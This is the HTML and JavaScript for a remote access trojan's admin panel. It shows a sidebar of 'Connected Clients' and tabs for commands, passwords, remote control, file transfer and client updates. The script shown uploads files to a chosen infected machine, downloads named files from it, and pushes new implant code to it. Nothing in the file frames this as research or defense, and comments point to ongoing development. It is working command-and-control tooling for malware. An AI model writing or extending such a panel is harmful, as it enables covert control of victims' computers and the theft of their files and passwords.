<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        /* Previous CSS remains the same */
        .file-box {
            background: var(--card);
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="sidebar" id="sidebar">
        <h3 style="padding: 15px; margin: 0;">Connected Clients</h3>
        <div id="client-list"></div>
    </div>
    <div class="main">
        <h1>Admin Panel</h1>
        <div class="tab-buttons">
            <button class="tab-btn active" onclick="openTab('commands')">Commands</button>
            <button class="tab-btn" onclick="openTab('passwords')">Passwords</button>
            <button class="tab-btn" onclick="openTab('remote')">Remote Control</button>
            <button class="tab-btn" onclick="openTab('files')">Files</button>
            <button class="tab-btn" onclick="openTab('update')">Update Client</button>
        </div>

        <!-- Commands Tab (Previous code remains) -->

        <!-- Files Tab -->
        <div id="files" class="tab-content">
            <div class="file-box">
                <h3>Upload File</h3>
                <input type="file" id="file-input">
                <button onclick="uploadFile()">Upload</button>
                
                <h3>Download File</h3>
                <input type="text" id="download-filename" placeholder="Filename">
                <button onclick="downloadFile()">Download</button>
            </div>
        </div>

        <!-- Update Client Tab -->
        <div id="update" class="tab-content">
            <div class="command-box">
                <h3>Update Client Code</h3>
                <textarea id="client-code" placeholder="Paste new client code here..."></textarea>
                <button onclick="updateClient()">Update</button>
                <pre id="update-status"></pre>
            </div>
        </div>
    </div>

    <script>
        // Previous JavaScript remains the same

        // File upload
        function uploadFile() {
            if (!selectedClient) return alert('Select a client first!');
            const fileInput = document.getElementById('file-input');
            const file = fileInput.files[0];
            if (!file) return alert('No file selected!');

            const formData = new FormData();
            formData.append('file', file);
            fetch('/api/upload', {
                method: 'POST',
                body: formData
            }).then(res => res.json())
              .then(data => alert(data.status || data.error));
        }

        // File download
        function downloadFile() {
            if (!selectedClient) return alert('Select a client first!');
            const filename = document.getElementById('download-filename').value;
            if (!filename) return alert('Enter a filename!');
            window.open(`/api/download?filename=${filename}`, '_blank');
        }

        // Client code update
        function updateClient() {
            if (!selectedClient) return alert('Select a client first!');
            const code = document.getElementById('client-code').value;
            if (!code) return alert('Enter code!');
            
            fetch('/api/update_client', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ client_id: selectedClient, code: code })
            }).then(res => res.json())
              .then(data => {
                  document.getElementById('update-status').textContent = data.status || data.error;
              });
        }
    </script>
</body>
</html>
